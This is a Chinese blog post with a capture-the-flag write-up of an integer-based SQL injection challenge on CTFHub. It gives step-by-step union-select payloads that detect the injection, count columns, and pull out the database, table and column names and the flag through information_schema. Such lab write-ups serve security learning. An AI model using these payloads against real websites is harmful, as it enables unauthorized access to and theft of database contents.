---
title: SQL注入--整数注入
date: 2020-04-07 15:04:05
tags: SQL注入
categories: 技术
photos: https://cdn.jsdelivr.net/gh/yremp/cdn@2.1.5/img/cover/(2).jpg.webp
---



﻿前言：前几天（很久以前）在ctfhub上做了一道整形注入的题。
什么是整形注入呐。[点这！](https://blog.csdn.net/qq_45869039/article/details/105190243)
直接入题！！！
**1.先判断是否存在注入。**
payload:

> ?id=1 and 1=1

![在这里插入图片描述](https://img-blog.csdnimg.cn/2020040712211553.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)
看到这里的正常回显。
然后

> ？id=1 and 1=2

 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200407122504901.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)
 回显错误。可以判断出是整形。
 **2.判断列数。**
 order by语句。
> ?id=1 order by 1

1 2  3.....直到出现报错。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200407123120136.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)
可以判断出只有两列。
3.**爆数据库名。**
payload:

>  ?id=1 and 1=2 union select 1,database()

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200407123806722.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)
直接出来了！
**3.爆表名。**
payload:
```
?id=1 and 1=2 union select 1,group_concat(table_name)from information_schema.tables where table_schema='sqli'
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200407124035584.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)
出来了两个表。看到了flag的曙光。
**4.爆字段。**
payload:
```
?id=1 and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_name='flag'
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200407124334337.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)
**5.爆值。**
payload：

```
?id=1 and 1=2 union select 1,group_concat(flag) from sqli.flag

```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200407124507438.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)
这样就拿到了flag？就这？自己的注入还是太菜,还需要加强。
